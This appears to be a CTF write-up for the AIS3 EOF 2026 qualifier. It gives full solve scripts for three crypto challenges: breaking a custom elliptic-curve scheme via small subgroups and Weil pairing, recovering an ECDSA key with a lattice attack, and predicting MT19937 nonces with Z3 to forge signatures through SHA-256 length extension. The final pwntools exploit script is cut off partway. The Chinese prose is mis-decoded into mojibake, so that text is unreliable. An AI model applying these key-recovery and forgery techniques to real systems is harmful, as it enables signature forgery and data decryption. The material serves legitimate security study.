---
title: "AIS3 EOF 2026 Qualification Writeup"
date: "2025-12-26"
categories: ["å­¸ç¿’ç­†è¨˜", "CTF", "é¡Œè§£"]
tags: ["AIS3", "è³‡è¨Šå®‰å…¨"]
featuredImage: "./featured.png"
---

é€™æ¬¡ AIS3 EOF 2026 Qualification åŒæ™‚ä¹Ÿæ˜¯è¨ˆç®—æ©Ÿå®‰å…¨çš„æœŸæœ«è€ƒï¼Œæˆ‘çš„éšŠä¼æ˜¯ **StarMachine**ï¼Œè·Ÿ Andromeda, Qwertypig, chenyanjun ä¸€éšŠï¼Œæˆ‘ä¸»è¦è² è²¬ crypto çš„éƒ¨ä»½ï¼Œä½†æ‰‹ç™¢å¯«äº†ä¸€é» web è·Ÿ reverseï¼Œpwn å¯¦åœ¨æ˜¯å¤ªé›£äº†ï¼Œæˆ‘çœ‹äº†ä¸‰é¡Œéƒ½å¯«ä¸å‡ºä¾†ï¼Œåªå¥½æ”¾æ£„ã€‚

## Crypto

### catcat's message

#### é¡Œç›®æè¿°

é¡Œç›®çµ¦çš„ code å¾ˆé†œï¼Œæ‰€ä»¥æˆ‘å…ˆæ•´ç†ä¸€ä¸‹ï¼š

<Details summary="refactored.py">

```py
from sage.all import *
import secrets

with open('flag.txt', 'rb') as f:
    flag = f.read()

flag = [int(bit) for byte in flag for bit in f'{byte:08b}']

R = PolynomialRing(ZZ, names=('x',))
(x,) = R._first_ngens(1)

f1 = 3471086628063885446357238753610323531339793559544546903532909144431975428449306236097334672163550644000*x**7 + 84164703558004000847171599254942386241373795544353150531373272670049397760530800008840197737820366466346314691162*x**6 + 91064528951076613265720743351539296774527279629238715675150132217418711139411039580553128030185345691325519935046*x**5 + 31838373662325139580926902452637696183043785768442789736602748197181912878103291332207751350605297251672800447952 * \
    x**4 + 21725422740459928990591308588258432180565692590248212021408656855315251472837770646928856382097832397887844336884*x**3 + 232701688844828316746402724793237178717464441244532163700038748140038967163962591066546062836475323177856883965170 * \
    x**2 + 250210421739490121280267358806528070202074006488405548116408889541562281570437524908655234300295156558260644714790 * \
    x + 220273362144208970479265455330337458917043647417072292667607653673224970006747007341371609183229917395181118430820
f2 = 10413259884191656339071716260830970594019380678633640710598727433295926285347918708292004016490651932000*x**7 + 252494110674012002541514797764827158724121386633059451594119818010148193281592400026520593213461099399038944073486*x**6 + 14529160840260745786509496359724356787188326132801486485566133985535665069892295966690495950982676949536238346962*x**5 + 95515120986975418742780707357913088549131357305328369209808244591545738634309873996623254051815891755018401343856 * \
    x**4 + 65176268221379786971773925764775296541697077770744636064225970565945754418513311940786569146293497193663533010652*x**3 + 180776214508546762217902706989924469079606298223767170020347719086675964795206127649700412230279249284690008979158 * \
    x**2 + 233302413192532175819496609029797143533434993955387323269458143291245908014630929176027926621738749425901291228018 * \
    x + 143491234406688723416490898601225309678343916741387556923054435686233973323559376474177051270543031936592520011397

p = 258664426012969094010652733694893533536393512754914660539884262666720468348340822774968888139573360124440321458177
curve = EllipticCurve(GF(p), [0, 0, 0, 0, 1])
P1 = curve(211327896882745355133216154117765694506824267591963425810864360539127436927129408124317179524815263831669171942288,
           242000360178127454722920758782320325120065800315232786687003874687882586608857040803085327019415054542726981896082)
P2 = curve(141078002483297354166779897252895086829637396399741587968861330915310465563157775245215359678414439802307293763593,
           21987419692484616093788518727313616089990324856173653004512069981050648496581282307403640131128425072464960150591)


def encrypt(x1, x2, ctrl=0):
    u = secrets.randbelow(p)
    return (f1(x1) + (1 - ctrl) * u) * P1 + (f2(x2) + (ctrl) * u) * P2


print("P1:", hex(P1.xy()[0]))
print("P2:", hex(P2.xy()[0]))

for b in flag:
    r = secrets.randbelow(p)
    print(hex(encrypt(secrets.randbelow(p), r, ctrl=b ^ 1).xy()[0]))
    print(hex(encrypt(r, secrets.randbelow(p), ctrl=b ^ 0).xy()[0]))
```

</Details>

ä»–çµ¦äº†ä¸€å€‹æ©¢åœ“æ›²ç·šçš„è‡ªè£½åŠ å¯†ç³»çµ±ï¼Œä½¿ç”¨çš„æ›²ç·šç‚ºï¼š

$$
y^2 = x^3 + 1
$$

ä¸¦æŠŠ flag é€å€‹ bit åŠ å¯†ã€‚å°æ–¼ flag çš„æ¯å€‹ bitï¼Œæœƒç”¢ç”Ÿä¸€å€‹å…±äº«çš„éš¨æ©Ÿå€¼ $r$ï¼Œä¸¦è¼¸å‡ºå…©å€‹é» $C_1$ å’Œ $C_2$ã€‚åŠ å¯†å‡½æ•¸å»ºç«‹äº†å¦‚ä¸‹å½¢å¼çš„é»ï¼š

$$
C = (f_1(x_1) + (1-b) \cdot u) P_1 + (f_2(x_2) + b \cdot u) P_2
$$

å…¶ä¸­ $P_1, P_2$ ç‚ºå…¬é–‹åŸºé»ï¼Œ$f_1, f_2$ ç‚ºå¤šé …å¼ï¼Œ$u$ ç‚ºéš¨æ©Ÿé®ç½©ï¼Œ$b$ ç‚ºæ§åˆ¶ä½å…ƒï¼Œæ§åˆ¶å“ªå€‹å¤šé …å¼æœƒåŠ ä¸Šé®ç½©ã€‚

#### åˆ†æèˆ‡è§£æ³•

é€™é¡Œçš„å®‰å…¨æ€§ä»°è³´æ–¼ ECDLP çš„å›°é›£ç¨‹åº¦ï¼Œäº‹å¯¦ä¸Šå¦‚æœæˆ‘å€‘ç®—å‡ºåŸºé»çš„ orderï¼š

```
P1.order() = 2^46 * 3 * 7 * 13 * 499 * 8444461749428370424248824938781546531375899335154063827935233455917409239041
```

å¤ªæ£’äº†ï¼Œä»–åŒ…å«å¤§é‡çš„å°è³ªå› æ•¸ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥æŠŠé»æŠ•å½±åˆ°å°å­ç¾¤ä¸­ä¾†ç§’è§£ DLPã€‚åˆ†æä¸€ä¸‹ç•¶ flag çš„æ¯å€‹ bit è·Ÿ output çš„é—œä¿‚ï¼Œç•¶ bit = 1ï¼š

$$
\begin{aligned} C_1 & = (f_1(\text{rand}) + u) P_1 + (f_2(r) + 0) P_2 \ C_2 & = (f_1(r) + 0) P_1 + (f_2(\text{rand}) + u) P_2 \end{aligned}
$$

æ‰€ä»¥å¯ä»¥æ‹¿åˆ° $(f_1(r), f_2(r))$ ä¸€çµ„è·Ÿ $r$ é—œè¯çš„å€¼ï¼Œè€Œç•¶ bit = 0 æ™‚æœƒæ‹¿åˆ° $(f_1(\text{rand}), f_2(\text{rand}))$ æ¯«ç„¡é—œè¯ã€‚

å…ˆé¸ä¸€å€‹å°è³ªå› æ•¸ $l$ ä¾‹å¦‚ 499ï¼ŒæŠŠæ¯å€‹é»æŠ•å½±åˆ° order $l$ çš„å­ç¾¤ä¸­ï¼š

$$
C' = \frac{order(P_1)}{l} \cdot C
$$

æ¥è‘— Weil pairing å¯ä»¥å¹«æˆ‘å€‘æ‹¿å‡ºä¿‚æ•¸ï¼Œå°é» $C = a P_1 + b P_2$ï¼Œæˆ‘å€‘å¯ä»¥è¨ˆç®—ï¼š

$$
e(C, P_1) = e(a P_1, P_1) + e(b P_2, P_1) = e(P_2, P_1)^b
$$

ä»¤ $w = e(P_2, P_1)$ï¼Œç¬é–“è®Šæˆ $w^b = X = e(C, P_1) \pmod{l}$ çš„ DLP å•é¡Œï¼Œå¯ä»¥ç›´æ¥æš´åŠ›ç ´è§£å‡ºä¾†ã€‚

æ‰€ä»¥ç¾åœ¨å°æ–¼æ¯ä¸€å€‹ flag bit éƒ½æœƒç®—å‡ºä¸€çµ„ä¿‚æ•¸ $a, b$ï¼Œå…¶ä¸­æœ‰å¯èƒ½æ˜¯ $(f_1(r), f_2(r))$ ä»£è¡¨ bit = 1ï¼Œæˆ–æ˜¯ $(f_1(\text{rand}), f_2(\text{rand}))$ ä»£è¡¨ bit = 0ã€‚åªè¦çˆ†æœçœ‹æ˜¯å¦å­˜åœ¨ $r \in [0, l - 1]$ ä½¿å¾—ï¼š

$$
\begin{aligned} f_1(r) & \equiv a \pmod{l} \\ f_2(r) & \equiv b \pmod{l} \end{aligned}
$$

å¯ä»¥è©¦å¥½å¹¾å€‹å°è³ªå› æ•¸ï¼Œå¦‚æœå­˜åœ¨é€™æ¨£çš„ $r$ å°±ä»£è¡¨é«˜æ©Ÿç‡ bit = 1ï¼Œå¦å‰‡ bit = 0ã€‚

<Details summary="solve.py">

```py
from sage.all import *
import re

p = 258664426012969094010652733694893533536393512754914660539884262666720468348340822774968888139573360124440321458177
E = EllipticCurve(GF(p), [0, 0, 0, 0, 1])
R = PolynomialRing(GF(499), names=('x',))
(x,) = R._first_ngens(1)


def get_polys(modulus):
    R_ZZ = PolynomialRing(ZZ, names=('x',))
    (x,) = R_ZZ._first_ngens(1)

    f1 = 3471086628063885446357238753610323531339793559544546903532909144431975428449306236097334672163550644000*x**7 + 84164703558004000847171599254942386241373795544353150531373272670049397760530800008840197737820366466346314691162*x**6 + 91064528951076613265720743351539296774527279629238715675150132217418711139411039580553128030185345691325519935046*x**5 + 31838373662325139580926902452637696183043785768442789736602748197181912878103291332207751350605297251672800447952 * \
        x**4 + 21725422740459928990591308588258432180565692590248212021408656855315251472837770646928856382097832397887844336884*x**3 + 232701688844828316746402724793237178717464441244532163700038748140038967163962591066546062836475323177856883965170 * \
        x**2 + 250210421739490121280267358806528070202074006488405548116408889541562281570437524908655234300295156558260644714790 * \
        x + 220273362144208970479265455330337458917043647417072292667607653673224970006747007341371609183229917395181118430820
    f2 = 10413259884191656339071716260830970594019380678633640710598727433295926285347918708292004016490651932000*x**7 + 252494110674012002541514797764827158724121386633059451594119818010148193281592400026520593213461099399038944073486*x**6 + 14529160840260745786509496359724356787188326132801486485566133985535665069892295966690495950982676949536238346962*x**5 + 95515120986975418742780707357913088549131357305328369209808244591545738634309873996623254051815891755018401343856 * \
        x**4 + 65176268221379786971773925764775296541697077770744636064225970565945754418513311940786569146293497193663533010652*x**3 + 180776214508546762217902706989924469079606298223767170020347719086675964795206127649700412230279249284690008979158 * \
        x**2 + 233302413192532175819496609029797143533434993955387323269458143291245908014630929176027926621738749425901291228018 * \
        x + 143491234406688723416490898601225309678343916741387556923054435686233973323559376474177051270543031936592520011397

    R_mod = PolynomialRing(GF(modulus), names=('x',))
    f1 = R_mod(f1)
    f2 = R_mod(f2)
    return f1, f2


with open('output.txt', 'r') as f:
    content = re.findall(r'0x[0-9a-f]+', f.read())

P1 = E.lift_x(Integer(content[0]))
P2 = E.lift_x(Integer(content[1]))

ord_P1 = P1.order()

primes = [499, 13, 7]
prime_data = []

for ell in primes:
    M = ord_P1 // ell
    G1 = M * P1
    G2 = M * P2
    w = G1.weil_pairing(G2, ell)

    if w == 1:
        print(f"skipping prime {ell}, pairing is trivial")
        continue

    f1, f2 = get_polys(ell)

    valid_pairs = set()
    for r in range(ell):
        valid_pairs.add((f1(r), f2(r)))

    w_powers = {}
    curr = w.parent()(1)
    for i in range(ell):
        w_powers[curr] = i
        curr *= w

    prime_data.append({
        'ell': ell,
        'M': M,
        'G1': G1,
        'G2': G2,
        'w': w,
        'w_powers': w_powers,
        'valid_pairs': valid_pairs
    })


points = content[2:]
flag_bits = []

for i in range(0, len(points), 2):
    x1 = Integer(points[i])
    x2 = Integer(points[i+1])

    Q1_base = E.lift_x(x1)
    Q2_base = E.lift_x(x2)

    is_one = False

    # Try all 4 sign combinations
    for s1 in [1, -1]:
        for s2 in [1, -1]:
            curr_Q1 = s1 * Q1_base
            curr_Q2 = s2 * Q2_base

            consistent_all = True
            for data in prime_data:
                ell = data['ell']
                M = data['M']
                G1 = data['G1']
                G2 = data['G2']
                w_powers = data['w_powers']
                valid_pairs = data['valid_pairs']

                q1 = M * curr_Q1
                q2 = M * curr_Q2

                e1 = q1.weil_pairing(G1, ell)
                e2 = q2.weil_pairing(G2, ell)

                val_b1_raw = w_powers.get(e1)
                val_a2 = w_powers.get(e2)

                if val_b1_raw is None or val_a2 is None:
                    consistent_all = False
                    break

                val_b1 = (-val_b1_raw) % ell

                if (val_a2, val_b1) not in valid_pairs:
                    consistent_all = False
                    break

            if consistent_all:
                is_one = True
                break
        if is_one:
            break

    if is_one:
        flag_bits.append(1)
    else:
        flag_bits.append(0)

flag_bytes = bytearray()
for i in range(0, len(flag_bits), 8):
    byte_bits = flag_bits[i:i+8]
    byte_val = 0
    for bit in byte_bits:
        byte_val = (byte_val << 1) | bit
    flag_bytes.append(byte_val)

print(flag_bytes.decode())
```

</Details>

#### Flag

![Flag](./image.png)

`EOF{cats_dont_like_you_for_breaking_their_meowderful_scheme_...ğŸˆâš”ğŸˆ}`

flag æœ‰è¡¨æƒ…ç¬¦è™Ÿå¥½è§£

### Still Not Random

çœ‹åˆ°é€™é¡Œçš„ç¬¬ä¸€å€‹æƒ³æ³•æ˜¯ï¼Œå¥½çˆ½é€™å€‹è·Ÿä½œæ¥­å¹¾ä¹ä¸€æ¨£ï¼Œ~~çœŸçš„æ²’æœ‰æ´©é¡Œç–‘æ…®å—~~

#### é¡Œç›®æè¿°

é¡Œç›®çµ¦äº†ä¸€å€‹ Python scriptï¼Œç”¨ P-384 æ›²ç·šä¸Šçš„è‡ªè£½ ECDSA ç°½ç« ç°½äº† 4 å€‹è¨Šæ¯ã€‚æˆ‘å€‘æœ‰ç°½ç« è·Ÿä¸€å€‹ç”¨ AES-CTR åŠ å¯†çš„ flagã€‚åŠ å¯†ç”¨çš„ key æ˜¯ç°½ç« ç§é‘° `sk` çš„ä½ 128 bitsã€‚

#### åˆ†æèˆ‡è§£æ³•

æ ¸å¿ƒæ¼æ´åœ¨ nonce ç”Ÿæˆå‡½æ•¸ï¼š

```python
def sign(sk: int, msg: bytes, *, curve=P384, hashfunc=sha256) -> tuple[int, int]:
    key = hashfunc(str(sk).encode()).digest()
    k = int.from_bytes(key + hmac.new(key, msg, hashfunc).digest()) % curve.q
    # ...
```

ä¹Ÿå°±æ˜¯èªª

$$
k = \text{int}(\text{key} \parallel \text{HMAC(key, msg)}) \pmod q
$$

é€™è£¡çš„ `key` æ˜¯å¾ `sk` ä¾†çš„ï¼Œå°æ‰€æœ‰ç°½ç« éƒ½ä¸€æ¨£ã€‚HMAC éƒ¨åˆ†å‰‡éš¨è¨Šæ¯æ”¹è®Šã€‚å› ç‚º P-384 çš„ order $q$ å¤§ç´„æ˜¯ $2^{384}$ï¼Œè€Œæ§‹é€ å‡ºä¾†çš„æ•´æ•¸æ˜¯ 512 bitsï¼Œæ‰€ä»¥ $k = X \pmod q$ ç­‰åƒ¹æ–¼ $k = X - m \cdot q$ã€‚å› ç‚º $X$ çš„é«˜ 256 bits æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥ $m$ å°æ‰€æœ‰ç°½ç« ä¾†èªªæ‡‰è©²æ˜¯å¸¸æ•¸ï¼ˆæˆ–é ‚å¤šå·® 1ï¼‰ã€‚

æ‰€ä»¥æˆ‘å€‘å¯ä»¥è¿‘ä¼¼ï¼š

$$
k_i - k_j \approx h_i - h_j
$$

$$
|k_i - k_j| < 2^{256}
$$

é€™æ¯” $q \approx 2^{384}$ å°å¾ˆå¤šï¼Œæ­£æ˜¯ Hidden Number Problem çš„æƒ…æ³ï¼Œå¯ä»¥ç”¨ Lattice Attack ä¾†æ‰“ã€‚ç°½ç« æ–¹ç¨‹å¼æ˜¯ï¼š

$$
s_i \equiv k_i + sk \cdot e_i \pmod q
$$

æ•´ç†å¾—

$$
k_i \equiv s_i - sk \cdot e_i \pmod q
$$

è€ƒæ…®å…©å€‹ç°½ç« çš„å·®ï¼š

$$
k_i - k_0 \equiv (s_i - s_0) - sk \cdot (e_i - e_0) \pmod q
$$

ä»¤ $\Delta k_i = k_i - k_0$, $\Delta s_i = s_i - s_0$, $\Delta e_i = e_i - e_0$ï¼Œå¾—åˆ°ï¼š

$$
sk \cdot \Delta e_i - \Delta s_i \equiv -\Delta k_i \pmod q
$$

æˆ‘å€‘çŸ¥é“ $|\Delta k_i| < 2^{256}$ã€‚æ§‹é€ çŸ©é™£ï¼š

$$
\begin{pmatrix}
q & 0 & 0 \\
0 & q & 0 \\
0 & 0 & q \\
\Delta e_1 & \Delta e_2 & \Delta e_3
\end{pmatrix}
$$

ç›®æ¨™å‘é‡æ˜¯ $U = (\Delta s_1, \Delta s_2, \Delta s_3)$ã€‚æˆ‘å€‘æƒ³æ‰¾åˆ°ä¸€å€‹å‘é‡ $V = (sk \cdot \Delta e_1, sk \cdot \Delta e_2, sk \cdot \Delta e_3)$ ä½¿å¾— $V \approx U$ã€‚

$|V - U| < 2^{256}$ å¾ˆå°ï¼Œç”¨ SageMath çš„ `closest_vector` å° LLL-reduced basis åšï¼Œå°±å¯ä»¥æ‰¾åˆ° $V$ã€‚æ‰¾åˆ° $V$ å°±èƒ½ç®—å› $sk$ï¼š

$$
v_1 \equiv sk \cdot \Delta e_1 \pmod q \implies sk \equiv v_1 \cdot \Delta e_1^{-1} \pmod q
$$

ç®—å‡º $sk$ å¾Œï¼Œç®—å‡º AES keyï¼š

```python
key = (int(sk) & ((1 << 128) - 1)).to_bytes(16, 'big')
```

ç„¶å¾Œè§£å‡º flagã€‚æœ€å¾Œä¸€å€‹å•é¡Œæ˜¯ `closest_vector` æ˜¯è¿‘ä¼¼è§£ï¼Œæˆ‘å€‘éœ€è¦çˆ†æœé™„è¿‘çš„å¹¾å€‹å‘é‡ä¾†æ‰¾åˆ°æ­£ç¢ºçš„ $sk$ï¼Œå–æ¼”ç®—æ³•å¾—åˆ°çš„å‘é‡ $v$ï¼Œå° LLL åŸºåº•çµ„åˆå‡ºé™„è¿‘çš„å‘é‡è©¦è©¦çœ‹ï¼š

$$
v' = v + \sum_i c_i b_i, \quad c_i \in [-2, 2]
$$

å˜—è©¦æ‰€æœ‰çµ„åˆç›´åˆ°æ‰¾åˆ°æ­£ç¢ºçš„ flagã€‚

<Details summary="solve.py">

```py
import hmac
from hashlib import sha256
from Crypto.Cipher import AES
from sage.all import EllipticCurve, GF, Matrix, ZZ, vector, inverse_mod
from sage.modules.free_module_integer import IntegerLattice

# ---------- P-384 params ----------
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
q = 39402006196394479212279040100143613805079739270465446667946905279627659399113263569398956308152294913554433653942643
Gx = 26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087
Gy = 8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871

curve = EllipticCurve(GF(p), [a, b])
G = curve(Gx, Gy)


def p2i(P):
    return int(P[0]) * p + int(P[1])


# ---------- given data ----------
msgs = [
    b"https://www.youtube.com/watch?v=LaX6EIkk_pQ",
    b"https://www.youtube.com/watch?v=wK4wA0aKvg8",
    b"https://www.youtube.com/watch?v=iq90nHs3Gbs",
    b"https://www.youtube.com/watch?v=zTKADhU__sw",
]

sigs = [
    (317707421133410288073354603009480426136391906002873302709570879761947103070512898051132583840618463139472027601216698251294206460344755339051109898589809987983731707077909099505833365567522347006453766545663380230105595126817790425,
     25185752159924706126981435669717936861361993674900106138337831137838509453749313533989197233649309651483579988978205),
    (417548456675579988606680466439690234874946492911623920447331037240230655879606626325624623314611471522814787475988129078726743347417903386362824681134780863810523742180718053363084828145812067731683272119151061828749117659255650820,
     27618563118772187320593702066291845973666620541831283288991142064228070314197536489147588491763843793593821643513457),
    (703771273054730080235579285501232710659154148145979519264450072512823561624248636822569827736905476306443746390214567198923437156846958456303186787370323078966806939434118158768394748234214487029382926999880135374613932395712372460,
     27052092405825396792237011211691900251888872753276208811631357208317438773416505653305767076226992282260977625878007),
    (821717323558426535455119744526279609022144869806906586662554363968363839151910768914318502227461974453838258550953434850776924606792184210954238562503515009237179979646111655773804054528212491391076376250546737439142144165942539844,
     28870411728276849847003745583242490365442899058004875752358198407125701328587711166784961247940279464305857022011977),
]

ct = b"iXm\x982\xc5\xf23\x85\x88\x91\x0c\x7f\xdc\x1b,\x1b\x82\x9d\xcd\x00 BWn\xad\n\xc3`\xe7\x8e\xfc`%\x9cQ\x12E\x97\x97\xa5\xd5t\x8b\x87v\xb4\xcf\x8d"

# ---------- compute e_i ----------
es, ss, rs = [], [], []
for (r, s), msg in zip(sigs, msgs):
    e = int.from_bytes(hmac.new(r.to_bytes(1337, "big"), msg, sha256).digest(), "big") % q
    es.append(e)
    ss.append(s)
    rs.append(r)

# differences vs index 0
t = [(es[0] - es[i]) % q for i in range(1, 4)]  # t1,t2,t3
u = [(ss[0] - ss[i]) % q for i in range(1, 4)]  # u1,u2,u3

t1, t2, t3 = t
u1, u2, u3 = u

# ---------- build lattice for CVP ----------
# L = < (q,0,0), (0,q,0), (0,0,q), (t1,t2,t3) >
B = Matrix(ZZ, [
    [q, 0, 0],
    [0, q, 0],
    [0, 0, q],
    [t1, t2, t3],
]).LLL()

# drop zero rows (rank 3)
rows = [row for row in B.rows() if not row.is_zero()]
Basis = Matrix(ZZ, rows)
Lat = IntegerLattice(Basis)

target = vector(ZZ, [u1, u2, u3])
v0 = Lat.closest_vector(target)

# ---------- local search around v0 ----------


def sk_from_v(v):
    # use first coordinate; t1 must be invertible mod q (almost always)
    return int((v[0] * inverse_mod(t1, q)) % q)


def verify_sk(sk):
    # reproduce r for message 0
    key_hash = sha256(str(sk).encode()).digest()
    k = int.from_bytes(key_hash + hmac.new(key_hash, msgs[0], sha256).digest(), "big") % q
    R = k * G
    return p2i(R) == rs[0]


def decrypt_flag(sk):
    key = (sk & ((1 << 128) - 1)).to_bytes(16, "big")  # python default in challenge is big
    nonce, ciphertext = ct[:8], ct[8:]
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return cipher.decrypt(ciphertext)


# search radius (small is usually enough)
coeff_range = range(-2, 3)

# use up to 3 basis vectors (basis is 3x3 after zero-row removal)
basis_vecs = [vector(ZZ, Basis[i]) for i in range(Basis.nrows())]
if len(basis_vecs) > 3:
    basis_vecs = basis_vecs[:3]

cands = []
for c0 in coeff_range:
    for c1 in coeff_range:
        for c2 in coeff_range:
            dv = c0*basis_vecs[0] + c1*basis_vecs[1] + c2*basis_vecs[2]
            v = v0 + dv
            sk = sk_from_v(v)
            if sk in cands:
                continue
            cands.append(sk)
            if verify_sk(sk):
                pt = decrypt_flag(sk)
                print("Found sk =", sk)
                print("Flag:", pt)
                exit()

print("Oh no, flag not found :(")
```

</Details>

#### Flag

![Flag](./image-7.png)

`EOF{just_some_small_bruteforce_after_LLL}`

### dogdog's Proof

#### é¡Œç›®æè¿°

é€™é¡Œæ˜¯ server é¡Œï¼Œæœå‹™æä¾›ä¸‰å€‹åŠŸèƒ½ï¼š

1. å–å¾—äº‚æ•¸ (`wowoof`)
2. ç°½ç«  (`wowooF`)
3. é©—è­‰ (`wowoOf`)

ä½¿ç”¨ secp256r1 (P-256) çš„ ECDSAï¼Œä¸¦ä¸” nonce $k$ ä¾†è‡ª `random.getrandbits(255)`ï¼Œè¨Šæ¯é›œæ¹Šç‚º `SHA-256(salt || msg)`ï¼Œé©—è­‰æ™‚å¦‚æœè¨Šæ¯åŒ…å« `i_am_the_king_of_the_dog` ä¸”ç°½ç« åˆæ³•ï¼Œå°±æœƒå°å‡º flagã€‚

#### åˆ†æèˆ‡è§£æ³•

ç¬¬ä¸€å€‹å¾ˆå®¹æ˜“ç™¼ç¾çš„æ´æ˜¯ nonce $k$ æ˜¯ç”¨ python å…§å»ºçš„ random ç”Ÿæˆï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯æƒ³è¾¦æ³•é‚„åŸ MT19937 çš„ stateã€‚æˆ‘å€‘å¯ä»¥ç”¨ `wowoof` ç„¡é™å–å¾— `getrandbits(134) ^ getrandbits(134)`ï¼Œç„¶å¾Œåˆ‡æˆ 4 \* 32 + 6 bits çš„ chunkï¼Œå‰é¢çš„éƒ¨ä»½å¯ä»¥ç›´æ¥ untemperï¼Œå¾Œé¢ 6 bits æ‹¿ä¾†åš Z3 symbolic solvingï¼Œé‚„åŸå‡ºå®Œæ•´çš„ MT19937 stateã€‚

ECDSA çš„ nonce å¯é æ¸¬å¾Œï¼Œç§é‘° $d$ å°±å¾ˆå¥½ç®—äº†ï¼Œç°½ç« å…¬å¼ç‚ºï¼š

$$
s \equiv k^{-1}(z + r d) \pmod n
$$

å°åŒä¸€å€‹è¨Šæ¯ç°½å…©æ¬¡å¾—åˆ°ï¼š

$$
\begin{cases}
z \equiv s_1 k_1 - r_1 d \\
z \equiv s_2 k_2 - r_2 d
\end{cases}
$$

ç›¸æ¸›æ¶ˆå» $z$ ç›´æ¥è§£å‡ºç§é‘° $d$ï¼š

$$
d \equiv (s_1 k_1 - s_2 k_2)\cdot (r_1 - r_2)^{-1} \pmod n
$$

æ¥ä¸‹ä¾†è¦å½é€ ç°½ç« ï¼Œç°½ç« ç”¨

```python
z = sha256(salt + msg)
```

ä¸¦ä¸”ç¦æ­¢åœ¨ msg è£¡å‡ºç¾ `i_am_the_king_of_the_dog`ï¼Œä½†å› ç‚º salt å›ºå®šï¼Œä¸”ç”¨çš„æ˜¯è£¸ SHA256ï¼Œæ‰€ä»¥å¯ä»¥åš Length Extension Attackã€‚

æˆ‘å€‘å…ˆç”¨åˆæ³•è¨Šæ¯ `msg1` å–å¾—ç°½ç«  `(r1, s1)`ï¼Œç„¶å¾Œå½é€ è¨Šæ¯ `msg2 = msg1 || padding || extra`ï¼Œè¨ˆç®—å‡ºæ–°çš„é›œæ¹Šå€¼ `z2`ï¼Œç„¶å¾Œè¨ˆç®—ç°½ç« å‚³çµ¦ server å°±æ‹¿åˆ° flag äº†ã€‚

<Details summary="solve.py">

```py
from pwn import *
from z3 import *
from tinyec import registry
import hashpumpy
import random
import time

# =========================================================
# 0) Config
# =========================================================
context.log_level = "info"
curve = registry.get_curve("secp256r1")
n = curve.field.n
G = curve.g

# =========================================================
# 1) Untemper utils (32-bit MT19937 output)
# =========================================================


def recover_left_shift_mask(y, shift, mask):
    x = y
    for _ in range(32 // shift + 1):
        x = y ^ ((x << shift) & mask)
    return x


def recover_right_shift(y, shift):
    x = y
    for _ in range(32 // shift + 1):
        x = y ^ (x >> shift)
    return x


def untemper(y):
    y &= 0xFFFFFFFF
    y = recover_right_shift(y, 18)
    y = recover_left_shift_mask(y, 15, 0xEFC60000)
    y = recover_left_shift_mask(y, 7, 0x9D2C5680)
    y = recover_right_shift(y, 11)
    return y & 0xFFFFFFFF


# =========================================================
# 2) Compact Hybrid MT19937 solver (Z3)
# =========================================================
N, M = 624, 397
MATRIX_A = 0x9908B0DF
UM = 0x80000000
LM = 0x7FFFFFFF


def temper_z3(y):
    y = y ^ LShR(y, 11)
    y = y ^ ((y << 7) & 0x9D2C5680)
    y = y ^ ((y << 15) & 0xEFC60000)
    y = y ^ LShR(y, 18)
    return y


class MTHybrid:
    def __init__(self):
        self.solver = Solver()
        self.S = []  # lazy BitVec list

    def var(self, i):
        while len(self.S) <= i:
            self.S.append(BitVec(f"S_{len(self.S)}", 32))
        return self.S[i]

    def add_recurrence(self, upto):
        # state[k] = state[k-624+397] ^ twist(state[k-624], state[k-623])
        for k in range(N, upto + 1):
            s_prev = self.var(k - N)
            s_next = self.var(k - N + 1)
            s_mid = self.var(k - N + M)

            y = (s_prev & UM) | (s_next & LM)
            twist = LShR(y, 1)
            twist = If((y & 1) == 1, twist ^ MATRIX_A, twist)

            self.solver.add(self.var(k) == (s_mid ^ twist))

    def solve(self, full_constraints, partial_constraints, max_idx, want=624):
        self.add_recurrence(max_idx)

        # Full (untempered) constraints: S[a] ^ S[b] == val32
        for a, b, val32 in full_constraints:
            self.solver.add((self.var(a) ^ self.var(b)) == (val32 & 0xFFFFFFFF))

        # Partial constraints: top6bits(temper(S[a]^S[b])) == leak
        for a, b, top6 in partial_constraints:
            x = self.var(a) ^ self.var(b)
            self.solver.add(LShR(temper_z3(x), 26) == (top6 & 0x3F))

        t0 = time.time()
        if self.solver.check() != sat:
            return None
        log.success(f"Z3 solved in {time.time() - t0:.2f}s")
        m = self.solver.model()
        return [m[self.var(i)].as_long() for i in range(want)]

# =========================================================
# 3) Exploit
# =========================================================


def build_constraints(samples):
    """
    Each sample is:
        getrandbits(134) ^ getrandbits(134)
    One getrandbits(134) consumes 5 MT outputs (32*4 + 6 bits).
    XOR of two => uses 10 MT outputs per sample.
    """
    full = []
    partial = []
    idx = 0
    for real_val in samples:
        # chunks 0..3 are full 32-bit
        for i in range(4):
            chunk = (real_val >> (32 * i)) & 0xFFFFFFFF
            diff = untemper(chunk)
            full.append((idx + i, idx + 5 + i, diff))

        # chunk 4: only top 6 bits (since 134 = 128 + 6)
        top6 = (real_val >> 128) & 0x3F
        partial.append((idx + 4, idx + 9, top6))

        idx += 10

    max_idx = idx - 1
    return full, partial, max_idx


def get_ticket_samples(io, count):
    samples = []
    io.recvuntil(b"option > ")
    for _ in range(count):
        io.sendline(b"wowoof")
        line = io.recvline().decode()
        # "WooFf wOOF {num}'f ğŸ•!"
        num = int(line.split("wOOF ")[1].split("'f")[0])
        samples.append(num)
        io.recvuntil(b"option > ")
    return samples


def sync_rng(io, sample_count=300):
    log.info(f"Phase 1: collecting {sample_count} samples")
    samples = get_ticket_samples(io, sample_count)

    log.info("Building constraints")
    full, partial, max_idx = build_constraints(samples)

    log.info("Solving MT19937 state (hybrid)")
    solver = MTHybrid()
    state624 = solver.solve(full, partial, max_idx=max_idx)
    if not state624:
        raise RuntimeError("Z3 UNSAT (try more samples)")

    # setstate expects: (version, (624 state words + index), gauss)
    random.setstate((3, tuple(state624 + [0]), None))

    # fast-forward local RNG by same number of calls server made during sampling
    for _ in range(sample_count):
        _ = random.getrandbits(134) ^ random.getrandbits(134)

    # verify sync
    log.info("Verifying sync")
    io.sendline(b"wowoof")
    line = io.recvline().decode()
